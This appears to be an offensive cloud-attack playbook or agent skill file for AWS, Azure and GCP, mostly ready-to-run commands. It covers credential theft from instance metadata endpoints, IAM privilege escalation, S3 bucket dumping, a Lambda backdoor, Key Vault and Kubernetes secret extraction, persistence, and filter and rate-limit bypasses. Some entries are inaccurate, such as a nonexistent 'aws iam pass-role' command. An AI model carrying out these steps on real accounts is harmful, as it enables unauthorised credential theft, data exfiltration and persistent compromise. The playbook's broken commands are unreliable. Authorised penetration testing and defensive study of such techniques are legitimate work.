---
name: cloud-02-cloud-advanced
sequence: cloud-02
category: infrastructure
domain: cloud
description: "Advanced cloud offensive methodology: AWS (IAM escalation, S3/SSRF, Lambda, EKS), Azure (Entra ID, RBAC, Key Vault, Functions, AKS), GCP (IAM, GKE, Cloud Functions, Cloud SQL, service accounts). Full kill chain from credential theft to persistence."
wordlist_ref: "wordlists/network/net-26-cloud-iam/"
---

# Advanced Cloud Offensive (AWS / Azure / GCP)

## Quick Workflow

1. Enumerate identity — `aws sts get-caller-identity`, `az account show`, `gcloud auth list`
2. Check privilege escalation paths — IAM PassRole, Owner role, serviceAccountTokenCreator
3. Find data stores — S3, Blob Storage, GCS, RDS, CosmosDB, Cloud SQL
4. Establish persistence — backdoor users, keys, automation rules
5. Lateral movement — cross-account roles, multi-tenant apps, project hopping

## AWS

### Identity & Enumeration
```bash
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --text | awk -F/ '{print $NF}')
aws iam list-attached-role-policies --role-name <role>
```

### IMDS Credential Theft
```bash
# IMDSv1 (legacy)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
# IMDSv2 — requires PUT token first
TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### IAM Privilege Escalation (24 known paths)
| Attack | Command |
|--------|---------|
| PassRole | `aws iam pass-role — create new resource with existing role` |
| CreatePolicyVersion | `aws iam create-policy-version — overwrite with admin policy` |
| SetDefaultPolicyVersion | `aws iam set-default-policy-version — activate old admin version` |
| CreateLoginProfile | `aws iam create-login-profile — create console password` |
| UpdateLoginProfile | `aws iam update-login-profile — change console password` |
| AttachUserPolicy | `aws iam attach-user-policy — grant admin to yourself` |

### S3 Exfiltration
```bash
aws s3 ls s3://<bucket> --no-sign-request
aws s3 sync s3://<bucket> ./dump --no-sign-request
aws s3api get-bucket-acl --bucket <bucket>
aws s3api get-bucket-policy --bucket <bucket>
```

### Lambda Backdoor
```bash
# Get function env vars (often contain secrets)
aws lambda get-function-configuration --function-name <name>
# Create new version with backdoor
aws lambda update-function-code --function-name <name> --zip-file fileb://evil.zip
```

### EKS Cluster Compromise
```bash
aws eks update-kubeconfig --name <cluster>
kubectl get nodes
kubectl get secrets --all-namespaces
```

## Azure

### Entra ID Enumeration
```bash
az account show
az ad user list
az role assignment list --all
az ad app list
```

### Key Vault Extraction
```bash
az keyvault secret list --vault-name <vault>
az keyvault secret show --vault-name <vault> --name <secret>
```

### Privilege Escalation
- **Owner role**: full control over all resources
- **Contributor**: can create managed identities → access any role
- **Key Vault Contributor**: read all secrets
- **AAD Global Admin**: full tenant control

### Automation Account Abuse
```bash
az automation account list
az automation runbook list --automation-account-name <name> --resource-group <rg>
```

## GCP

### Service Account Abuse
```bash
gcloud auth list
gcloud iam service-accounts list
gcloud iam service-accounts keys list --iam-account <sa>@<project>.iam.gserviceaccount.com
```

### GKE Enumeration
```bash
gcloud container clusters list
gcloud container clusters get-credentials <cluster>
kubectl get nodes,secrets,namespaces
```

### Cloud Functions
```bash
gcloud functions list
gcloud functions call <name> --data '{"dangerous":true}'
```

### Cloud SQL
```bash
gcloud sql instances list
gcloud sql databases list --instance <instance>
# If public IP, try direct connection
```

## Tools
- **AWS**: pacu, ScoutSuite, Prowler, cloudsplaining
- **Azure**: ROADtools, Stormspotter, MicroBurst
- **GCP**: gcp_enum, GCPBucketBrute, GCP-IAM-Collector
- **Multi-cloud**: CloudSploit, Cartography, Stratus Red Team

## Chaining
- SSRF → IMDS → IAM keys → S3 exfil → full account compromise
- Leaked AWS key → enumerate → escalate via PassRole → admin
- GCP metadata → service account token → GKE → cluster admin

## Hacker Mindset

**Cloud is API-driven.** No shell required. IAM is the kill chain. One misconfigured role escalates to full account control. Always enumerate without writes first.

## OOB Detection & Blind Confirmation

Use Burp Collaborator for blind SSRF detection via cloud metadata endpoints.


## Bypass Techniques

| Filter/Block | Bypass |
|-------------|--------|
| WAF/Input validation | Encoding, case variation, alternative syntax |
| Rate limiting | IP rotation via X-Forwarded-For, HTTP/2 multiplex |
| Blacklist | Alternative syntax, polyglot payloads |
| Blacklist bypass | Unicode, double encoding, null bytes |

## Wordlist Invocation

**Wordlist**: `wordlists/network/net-26-cloud-iam/` (9 payload files)

**Workflow**:
1. Start with `low` stage payloads — minimal risk probes
2. If signals detected, escalate to `med` stage
3. Use `high` only after confirmation (OOB/time-based where applicable)

**Tools**: curl, httpx, Burp Suite, or any HTTP client

